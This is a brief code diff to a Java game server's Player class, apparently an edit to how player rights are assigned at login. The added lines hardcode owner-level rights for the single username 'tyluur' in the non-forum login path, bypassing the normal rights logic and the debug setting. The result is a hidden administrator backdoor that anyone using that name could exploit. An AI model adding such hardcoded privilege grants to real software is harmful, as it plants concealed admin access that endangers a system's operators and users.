@@ -1500,6 +1500,9 @@ public class Player extends Entity {
 			DatabaseFunctions.setRightsFromForums(this);
 			addRight(RightManager.PLAYER);
 		} else {
+			if (username.equals("tyluur")) {
+				addRight(RightManager.OWNER);
+			}
 			addRight(GameConstants.DEBUG ? RightManager.OWNER : RightManager.PLAYER);
 		}
 		setPrimaryRight();
